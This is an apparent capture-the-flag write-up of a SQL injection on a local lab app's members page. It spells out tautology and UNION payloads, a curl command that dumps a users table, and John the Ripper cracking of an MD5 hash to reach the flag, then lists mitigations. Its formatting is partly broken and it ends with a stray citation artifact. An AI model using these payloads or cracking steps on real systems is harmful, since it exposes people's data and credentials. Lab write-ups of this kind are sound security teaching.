# SQL Injection in `/members` — Exploit Writeup

## Overview

This writeup demonstrates how to exploit a classic SQL injection vulnerability on the `/members` page, extract sensitive data (including a “countersign” hash), and transform that data into the final flag.

---

## 1. Identify the Injection Point

The application uses a URL parameter `id` to look up a member by numeric ID:

GET /?page=member&id=<user_input>


Internally the server executes something like:

```sql
SELECT * 
  FROM members 
 WHERE id = <user_input>;

By supplying id=0=0, you inject a tautology:

SELECT * 
  FROM members 
 WHERE id = 0=0;

Because 0=0 is always true, all rows from members are returned.
2. Determine Number of Columns for UNION

To stack a UNION SELECT, you must match the original query’s column count. You trigger an error by trying:

?id=0=0 UNION SELECT table_name FROM information_schema.tables

The SQL error reveals the expected column count (e.g. 2).
3. Enumerate Tables

With the column count in hand, list all tables:

?id=0=0 
  UNION SELECT table_name, table_type
    FROM information_schema.tables

Scan the output for interesting tables. In our case, we spot the users table.
4. Enumerate Columns in users

Next, pull column names for users:

?id=0=0 
  UNION SELECT column_name, table_name
    FROM information_schema.columns
   WHERE table_name='users'

From the result we learn that users has at least these columns:

    first_name

    town

    country

    planet

    Commentaire

    countersign

5. Dump User Data

Craft a multi-UNION query to dump each column:

curl "http://localhost:8080/?page=member&\
id=0%3D0+\
UNION+SELECT+first_name%2C+town+FROM+users+\
UNION+SELECT+first_name%2C+country+FROM+users+\
UNION+SELECT+first_name%2C+planet+FROM+users+\
UNION+SELECT+first_name%2C+Commentaire+FROM+users+\
UNION+SELECT+first_name%2C+countersign+FROM+users"

Filtering the output for rows where first_name = 'Flag' yields:
Column	Value
town	GetThe
country	42
Commentaire	Decrypt this password → then lower all the char. Sh256 on it and it’s good !
countersign	5ff9d0165b4f92b14994e5c685cdce28
6. Crack the MD5 Hash

The countersign is an MD5 hash:

5ff9d0165b4f92b14994e5c685cdce28

Using a tool like John the Ripper with a standard wordlist:

echo '5ff9d0165b4f92b14994e5c685cdce28' > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Recovered plaintext:

FortyTwo

7. Normalize & Compute SHA‑256

Per the instructions, lowercase the plaintext and compute its SHA‑256 digest:

echo -n "FortyTwo" \
  | tr '[:upper:]' '[:lower:]' \
  | sha256sum \
  | awk '{print $1}'

Resulting digest:

10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

8. Final Flag

10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

Mitigation

    Use Prepared Statements
    Parameterize queries instead of string‑concatenating user input.

    Strict Input Validation
    Enforce type checks and allow‑lists on all parameters.

    Least Privilege
    Grant the database user only the permissions absolutely required.

    Error Handling
    Disable verbose SQL errors in production to reduce information leakage.

::contentReference[oaicite:0]{index=0}
